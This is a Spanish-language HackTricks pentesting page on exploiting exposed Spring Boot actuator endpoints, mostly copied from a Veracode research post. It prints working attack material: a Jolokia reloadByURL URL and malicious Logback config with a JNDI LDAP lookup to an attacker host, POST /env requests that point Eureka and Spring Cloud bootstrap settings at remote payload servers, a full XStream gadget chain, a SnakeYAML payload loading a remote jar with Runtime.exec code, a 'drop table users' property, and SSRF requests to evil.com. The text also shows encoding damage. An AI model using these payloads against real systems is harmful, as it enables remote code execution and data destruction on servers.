# Spring Actuators

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* ¬øTrabajas en una **empresa de ciberseguridad**? ¬øQuieres ver tu **empresa anunciada en HackTricks**? ¬øO quieres tener acceso a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF**? ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obt√©n el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **√önete al** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## **Bypass de Autenticaci√≥n de Spring**

<figure><img src="../../.gitbook/assets/image (5) (2).png" alt=""><figcaption></figcaption></figure>

**De** [**https://raw.githubusercontent.com/Mike-n1/tips/main/SpringAuthBypass.png**](https://raw.githubusercontent.com/Mike-n1/tips/main/SpringAuthBypass.png)\*\*\*\*

## Explotando Spring Boot Actuators

**copiado de** [**https://www.veracode.com/blog/research/exploiting-spring-boot-actuators**](https://www.veracode.com/blog/research/exploiting-spring-boot-actuators)

El Framework Spring Boot incluye una serie de caracter√≠sticas llamadas actuators para ayudarte a monitorear y administrar tu aplicaci√≥n web cuando la implementas en producci√≥n. Dise√±ados para ser utilizados para auditor√≠a, salud y recopilaci√≥n de m√©tricas, tambi√©n pueden abrir una puerta oculta a tu servidor cuando est√°n mal configurados.

Cuando una aplicaci√≥n de Spring Boot est√° en ejecuci√≥n, autom√°ticamente registra varios endpoints (como '/health', '/trace', '/beans', '/env', etc.) en el proceso de enrutamiento. Para Spring Boot 1 - 1.4, son accesibles sin autenticaci√≥n, lo que causa problemas significativos de seguridad. A partir de la versi√≥n de Spring 1.5, todos los endpoints excepto '/health' y '/info' se consideran sensibles y est√°n asegurados por defecto, pero esta seguridad a menudo es deshabilitada por los desarrolladores de la aplicaci√≥n.

Los siguientes endpoints de Actuator podr√≠an tener implicaciones de seguridad que conducen a posibles vulnerabilidades:

* /dump - muestra un volcado de hilos (incluyendo una traza de pila)
* /trace - muestra los √∫ltimos mensajes HTTP (que podr√≠an incluir identificadores de sesi√≥n)
* /logfile - muestra el contenido del archivo de registro
* /shutdown - apaga la aplicaci√≥n
* /mappings - muestra todos los mapeos de controladores MVC
* /env - proporciona acceso al entorno de configuraci√≥n
* /actuator/env
* /restart - reinicia la aplicaci√≥n
* /heapdump - construye y devuelve un volcado de mont√≥n desde la JVM utilizada por nuestra aplicaci√≥n

Para Spring 1x, se registran bajo la URL ra√≠z, y en 2x se movieron a la ruta base "/actuator/".

**Explotaci√≥n:**

La mayor√≠a de los actuators solo admiten solicitudes GET y simplemente revelan datos de configuraci√≥n sensibles, pero algunos de ellos son particularmente interesantes para los cazadores de shells:

**1. Ejecuci√≥n de c√≥digo remoto a trav√©s de '/jolokia'**

Si la biblioteca Jolokia est√° en el classpath de la aplicaci√≥n objetivo, Spring Boot la expone autom√°ticamente bajo el endpoint '/jolokia' del actuator. Jolokia permite el acceso HTTP a todos los MBeans registrados y est√° dise√±ado para realizar las mismas operaciones que se pueden realizar con JMX. Es posible listar todas las acciones de MBeans disponibles utilizando la URL:

[**http://127.0.0.1:8090/jolokia/list**](https://www.veracode.com/blog/research/exploiting-spring-boot-actuators)

Nuevamente, la mayor√≠a de las acciones de MBeans solo revelan algunos datos del sistema, pero una es particularmente interesante:

![reloadByURL](https://www.veracode.com/sites/default/files/exploiting\_spring\_boot\_actuators\_jolokia.png)

La acci√≥n '**reloadByURL**', proporcionada por la biblioteca Logback, nos permite recargar la configuraci√≥n de registro desde una URL externa. Se puede activar simplemente navegando a: [**http://localhost:8090/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/artsploit.com!/logback.xml**](https://www.veracode.com/blog/research/exploiting-spring-boot-actuators)

Entonces, ¬øpor qu√© deber√≠amos preocuparnos por la configuraci√≥n de registro? Principalmente por dos cosas:

1. La configuraci√≥n tiene un formato XML y, por supuesto, Logback lo analiza con Entidades Externas habilitadas, por lo que es vulnerable a XXE ciego.
2. La configuraci√≥n de Logback tiene la caracter√≠stica ['Obtenci√≥n de variables de JNDI'](https://logback.qos.ch/manual/configuration.html#insertFromJNDI). En el archivo XML, podemos incluir una etiqueta como '**\<insertFromJNDI env-entry-name="java:comp/env/appName" as="appName" />**' y el atributo name se pasar√° al m√©todo DirContext.lookup(). Si podemos proporcionar un nombre arbitrario en la funci√≥n .lookup(), ni siquiera necesitamos XXE o HeapDump porque nos da una **Ejecuci√≥n de C√≥digo Remoto** completa.

**C√≥mo funciona:**

1\. Un atacante solicita la URL mencionada anteriormente para ejecutar la funci√≥n 'reloadByURL', proporcionada por la clase 'qos.logback.classic.jmx.JMXConfigurator'.

2\. La funci√≥n 'reloadByURL' descarga una nueva configuraci√≥n desde [http://artsploit.com/logback.xml](http://artsploit.com/logback.xml) y la analiza como una configuraci√≥n de Logback. Esta configuraci√≥n maliciosa deber√≠a tener el siguiente contenido:
```
<configuration>
<insertFromJNDI env-entry-name="ldap://artsploit.com:1389/jndi" as="appName" />
</configuration>
```
3\. Cuando este archivo se analiza en el servidor vulnerable, crea una conexi√≥n al servidor LDAP controlado por el atacante especificado en el valor del par√°metro "env-entry-name", lo que lleva a la resoluci√≥n de JNDI. El servidor LDAP malicioso puede devolver un objeto con tipo 'Referencia' para desencadenar una **ejecuci√≥n del bytecode suministrado** en la aplicaci√≥n objetivo. Los ataques de JNDI se explican detalladamente en este [documento de investigaci√≥n de MicroFocus](https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf). La [nueva t√©cnica de explotaci√≥n de JNDI](https://www.veracode.com/blog/research/exploiting-jndi-injections-java) (descrita anteriormente en nuestro blog) tambi√©n funciona aqu√≠, ya que Tomcat es el servidor de aplicaciones predeterminado en el Framework Spring Boot.

**2. Modificaci√≥n de la configuraci√≥n a trav√©s de '/env'**

Si las bibliotecas de Spring Cloud est√°n en el classpath, el punto final **'/env'** te permite modificar las propiedades ambientales de Spring. Todos los beans anotados como '**@ConfigurationProperties**' pueden ser modificados y reasignados. Muchas, pero no todas, las propiedades que podemos controlar se enumeran en el punto final '/configprops' del actuador. En realidad, hay toneladas de ellas, pero no est√° del todo claro qu√© necesitamos modificar para lograr algo. Despu√©s de pasar un par de d√≠as jugando con ellas, encontramos esto:
```
POST /env HTTP/1.1
Host: 127.0.0.1:8090
Content-Type: application/x-www-form-urlencoded
Content-Length: 65

eureka.client.serviceUrl.defaultZone=http://artsploit.com/n/xstream
```
Esta propiedad modifica la serviceURL de Eureka a un valor arbitrario. El servidor Eureka se utiliza normalmente como un servidor de descubrimiento, y casi todas las aplicaciones de Spring Cloud se registran en √©l y le env√≠an actualizaciones de estado. Si tienes suerte de tener Eureka-Client <1.8.7 en el classpath objetivo (normalmente se incluye en Spring Cloud Netflix), puedes aprovechar la vulnerabilidad de deserializaci√≥n de XStream en √©l. Todo lo que necesitas hacer es establecer la propiedad 'eureka.client.serviceUrl.defaultZone' a la URL de tu servidor ([http://artsploit.com/n/xstream](http://artsploit.com/n/xstream)) a trav√©s de '/env' y luego llamar al punto final '/refresh'. Despu√©s de eso, tu servidor deber√≠a servir la carga √∫til de XStream con el siguiente contenido:
```markup
<linked-hash-set>
<jdk.nashorn.internal.objects.NativeString>
<value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">
<dataHandler>
<dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">
<is class="javax.crypto.CipherInputStream">
<cipher class="javax.crypto.NullCipher">
<serviceIterator class="javax.imageio.spi.FilterIterator">
<iter class="javax.imageio.spi.FilterIterator">
<iter class="java.util.Collections$EmptyIterator"/>
<next class="java.lang.ProcessBuilder">
<command>
<string>/Applications/Calculator.app/Contents/MacOS/Calculator</string>
</command>
<redirectErrorStream>false</redirectErrorStream>
</next>
</iter>
<filter class="javax.imageio.ImageIO$ContainsFilter">
<method>
<class>java.lang.ProcessBuilder</class>
<name>start</name>
<parameter-types/>
</method>
<name>foo</name>
</filter>
<next class="string">foo</next>
</serviceIterator>
<lock/>
</cipher>
<input class="java.lang.ProcessBuilder$NullInputStream"/>
<ibuffer></ibuffer>
</is>
</dataSource>
</dataHandler>
</value>
</jdk.nashorn.internal.objects.NativeString>
</linked-hash-set>
```
Este payload de XStream es una versi√≥n ligeramente modificada de la cadena de gadgets ImageIO solo para JDK de la investigaci√≥n de [Marshalsec](https://github.com/mbechler/marshalsec). La √∫nica diferencia aqu√≠ es el uso de **LinkedHashSet** para activar el m√©todo 'jdk.nashorn.internal.objects.NativeString.hashCode()'. El payload original utiliza java.lang.Map para lograr el mismo comportamiento, pero la configuraci√≥n de XStream de Eureka tiene un [convertidor personalizado para mapas](https://github.com/Netflix/eureka/blob/master/eureka-client/src/main/java/com/netflix/discovery/converters/XmlXStream.java#L58) que lo hace inutilizable. El payload anterior no utiliza mapas en absoluto y se puede utilizar para lograr la ejecuci√≥n remota de c√≥digo sin restricciones adicionales.

Usando Spring Actuators, en realidad puedes explotar esta vulnerabilidad incluso si no tienes acceso a un servidor Eureka interno; solo necesitas un punto final "/env" disponible.

**Otras configuraciones √∫tiles:**

**spring.datasource.tomcat.validationQuery=drop+table+users** - te permite especificar cualquier consulta SQL y se ejecutar√° autom√°ticamente en la base de datos actual. Puede ser cualquier declaraci√≥n, incluyendo insertar, actualizar o eliminar.

![Explotando Spring Boot Actuators Drop Table](https://www.veracode.com/sites/default/files/exploiting\_spring\_boot\_actuators\_drop\_table.png)

**spring.datasource.tomcat.url**=jdbc:hsqldb:[https://localhost:3002/xdb](https://www.veracode.com/blog/research/exploiting-spring-boot-actuators) - te permite modificar la cadena de conexi√≥n JDBC actual.

El √∫ltimo se ve genial, pero el problema es cuando la aplicaci√≥n que ejecuta la conexi√≥n de la base de datos ya est√° establecida, simplemente actualizar la cadena JDBC no tiene ning√∫n efecto. Afortunadamente, hay otra propiedad que puede ayudarnos en este caso:

**spring.datasource.tomcat.max-active**=777

El truco que podemos usar aqu√≠ es aumentar el n√∫mero de conexiones simult√°neas a la base de datos. Entonces, podemos cambiar la cadena de conexi√≥n JDBC, aumentar el n√∫mero de conexiones y despu√©s enviar muchas solicitudes a la aplicaci√≥n para simular una carga pesada. Bajo carga, la aplicaci√≥n crear√° una nueva conexi√≥n de base de datos con la cadena JDBC maliciosa actualizada. Prob√© esta t√©cnica localmente con Mysql y funciona de maravilla.

![Explotando Spring Boot Actuators Max Active](https://www.veracode.com/sites/default/files/exploiting\_spring\_boot\_actuators\_max\_active.png)

Adem√°s de eso, hay otras propiedades que parecen interesantes, pero en la pr√°ctica no son realmente √∫tiles:

**spring.datasource.url** - cadena de conexi√≥n de la base de datos (solo se utiliza para la primera conexi√≥n)

**spring.datasource.jndiName** - cadena JNDI de la base de datos (solo se utiliza para la primera conexi√≥n)

**spring.datasource.tomcat.dataSourceJNDI** - cadena JNDI de la base de datos (no se utiliza en absoluto)

**spring.cloud.config.uri**=[http://artsploit.com/](https://www.veracode.com/blog/research/exploiting-spring-boot-actuators) - URL de configuraci√≥n de Spring Cloud (no tiene ning√∫n efecto despu√©s de iniciar la aplicaci√≥n, solo se utilizan los valores iniciales).

Estas propiedades no tienen ning√∫n efecto a menos que se llame al punto final '/restart'. Este punto final reinicia todo el ApplicationContext, pero est√° desactivado de forma predeterminada.

Hay muchas otras propiedades interesantes, pero la mayor√≠a de ellas no tienen un efecto inmediato despu√©s del cambio.

**N.B.** En Spring Boot 2x, el formato de solicitud para modificar propiedades a trav√©s del punto final '/env' es ligeramente diferente (utiliza formato json en su lugar), pero la idea es la misma.

**Un ejemplo de la aplicaci√≥n vulnerable:**

Si quieres probar esta vulnerabilidad localmente, cre√© una [aplicaci√≥n simple de Spring Boot en mi p√°gina de Github](https://github.com/artsploit/actuator-testbed). Todos los payloads deber√≠an funcionar all√≠, excepto la configuraci√≥n de la base de datos (a menos que la configures).

**Descubrimiento de caja negra:**

Una lista completa de actuadores predeterminados se puede encontrar aqu√≠: [https://github.com/artsploit/SecLists/blob/master/Discovery/Web-Content/spring-boot.txt](https://github.com/artsploit/SecLists/blob/master/Discovery/Web-Content/spring-boot.txt). Ten en cuenta que los desarrolladores de aplicaciones pueden crear sus propios puntos finales utilizando la anotaci√≥n @Endpoint.

**Actualizaci√≥n de mayo de 2019:**

Hay una forma m√°s confiable de lograr RCE a trav√©s de una modificaci√≥n de las propiedades ambientales de Spring.
```
POST /env HTTP/1.1
Host: 127.0.0.1:8090
Content-Type: application/x-www-form-urlencoded
Content-Length: 59

spring.cloud.bootstrap.location=http://artsploit.com/yaml-payload.yml
```
Esta solicitud modifica la propiedad 'spring.cloud.bootstrap.location', que se utiliza para cargar la configuraci√≥n externa y analizarla en formato YAML. Para que esto ocurra, tambi√©n necesitamos llamar al punto final '/refresh'.
```
POST /refresh HTTP/1.1
Host: 127.0.0.1:8090
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
```
Cuando la configuraci√≥n YAML se obtiene del servidor remoto, se analiza con la biblioteca SnakeYAML, que tambi√©n es susceptible a ataques de deserializaci√≥n. La carga √∫til (yaml-payload.yml) puede generarse utilizando la investigaci√≥n mencionada anteriormente de Marshalsec:
```
!!javax.script.ScriptEngineManager [
!!java.net.URLClassLoader [[
!!java.net.URL ["http://artsploit.com/yaml-payload.jar"]
]]
]
```
La deserializaci√≥n de este archivo desencadena la ejecuci√≥n del constructor de ScriptEngineManager con el URLClassLoader suministrado. En pocas palabras, esto lleva al m√©todo 'java.util.ServiceLoader#load(java.lang.Class\<S>, java.lang.ClassLoader)', que intenta encontrar todas las implementaciones de la interfaz 'ScriptEngineFactory' dentro de todas las bibliotecas en el classpath. Dado que podemos agregar una nueva biblioteca a trav√©s de URLClassLoader, podemos servir una nueva 'ScriptEngineFactory' con el bytecode malicioso en su interior. Para hacerlo, necesitamos crear un archivo jar con los siguientes archivos obligatorios: [yaml-payload.jar:/artsploit/AwesomeScriptEngineFactory.class](https://github.com/artsploit/yaml-payload/blob/master/src/artsploit/AwesomeScriptEngineFactory.java) debe contener el bytecode real, con la carga maliciosa en el constructor.
```
public class AwesomeScriptEngineFactory implements ScriptEngineFactory {

public AwesomeScriptEngineFactory() {
try {
Runtime.getRuntime().exec("dig scriptengine.x.artsploit.com");
Runtime.getRuntime().exec("/Applications/Calculator.app/Contents/MacOS/Calculator");
} catch (IOException e) {
e.printStackTrace();
}
}
```
[yaml-payload.jar:/META-INF/services/javax.script.ScriptEngineFactory](https://github.com/artsploit/yaml-payload/blob/master/src/META-INF/services/javax.script.ScriptEngineFactory) deber√≠a ser solo un archivo de texto que contenga una referencia completa a 'artsploit.AwesomeScriptEngineFactory', para que el ServiceLoader sepa d√≥nde encontrar la clase: **artsploit.AwesomeScriptEngineFactory**. Nuevamente, esta t√©cnica de explotaci√≥n requiere que Spring Cloud est√© en el classpath, pero en comparaci√≥n con el payload de XStream de Eureka, funciona incluso en la √∫ltima versi√≥n. Puedes encontrar el payload completo en mi proyecto de GitHub: [yaml-payload](https://github.com/artsploit/yaml-payload).

## Env + H2 RCE

Consulta esta p√°gina para aprender c√≥mo explotar la combinaci√≥n /env + H2: [https://spaceraccoon.dev/remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database](https://spaceraccoon.dev/remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database)

## SSRF en Spring Boot a trav√©s de una interpretaci√≥n incorrecta de la ruta <a href="#heading-ssrf-on-spring-boot-through-incorrect-pathname-interpretation" id="heading-ssrf-on-spring-boot-through-incorrect-pathname-interpretation"></a>

[**A partir de esta investigaci√≥n**](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies#heading-ssrf-on-spring-boot-through-incorrect-pathname-interpretation): El framework Spring acepta el car√°cter separador de par√°metros de matriz `;` antes de la primera barra diagonal de la ruta HTTP:
```http
GET ;1337/api/v1/me HTTP/1.1
Host: target.com
Connection: close
```
En un escenario como el siguiente:

<figure><img src="../../.gitbook/assets/image (717).png" alt="" width="563"><figcaption></figcaption></figure>

Teniendo en cuenta que Spring permite cualquier car√°cter despu√©s del separador de par√°metros de matriz, es posible utilizar el car√°cter `@` para obtener un punto final arbitrario tambi√©n.

A continuaci√≥n se muestra un ejemplo de la solicitud de explotaci√≥n:
```http
GET ;@evil.com/url HTTP/1.1
Host: target.com
Connection: close
```
## M√°s informaci√≥n

* [https://tutorialboy24.blogspot.com/2022/02/introduccion-a-spring-boot-relacionado.html](https://tutorialboy24.blogspot.com/2022/02/introduccion-a-spring-boot-relacionado.html)
* [https://blog.maass.xyz/seguridad-de-spring-actuator-parte-1-robo-de-secretos-usando-spring-actuators](https://blog.maass.xyz/seguridad-de-spring-actuator-parte-1-robo-de-secretos-usando-spring-actuators)
* [https://blog.maass.xyz/seguridad-de-spring-actuator-parte-2-encontrar-actuators-usando-analisis-de-codigo-estatico-con-semgrep](https://blog.maass.xyz/seguridad-de-spring-actuator-parte-2-encontrar-actuators-usando-analisis-de-codigo-estatico-con-semgrep)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* ¬øTrabajas en una **empresa de ciberseguridad**? ¬øQuieres ver tu **empresa anunciada en HackTricks**? ¬øO quieres tener acceso a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF**? ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obt√©n el [**merchandising oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **√önete al** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
